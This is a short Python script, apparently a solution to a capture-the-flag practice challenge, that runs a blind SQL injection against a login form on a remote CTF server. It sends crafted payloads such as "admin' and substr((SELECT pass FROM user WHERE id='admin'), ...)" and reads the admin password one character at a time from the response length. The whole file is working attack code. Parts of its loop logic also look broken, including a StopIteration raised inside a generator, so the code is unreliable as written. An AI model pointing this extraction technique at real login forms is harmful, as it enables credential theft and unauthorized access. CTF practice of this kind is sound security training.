#!/usr/bin/env python3
# coding: utf-8

import urllib.request
import urllib.parse


def login():
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    injection = lambda head, c: "admin' and substr((SELECT pass FROM user WHERE id='admin'), "+str(head)+", 1)<='"+c+"'; --"
    def is_pass(head, c):
        form = {"id": injection(head, c), "pass": ""}
        post = urllib.parse.urlencode(form).encode('utf-8')
        res = urllib.request.urlopen(url, data=post)
        body = res.read()
        return len(body) > 1000

    def blindSQL(head):
        for c in range(ord('z'), ord('0'), -1):
            c = chr(c)
            if is_pass(head, c):
                yield c
            else:
                raise StopIteration

    flag = ''
    for head in range(1, 32):
        if is_pass(head, ''):
            break
        for c in blindSQL(head):
            print(flag+c)
        else:
            print("match!")
            flag += c
    print("done\nflag: %s" % flag)
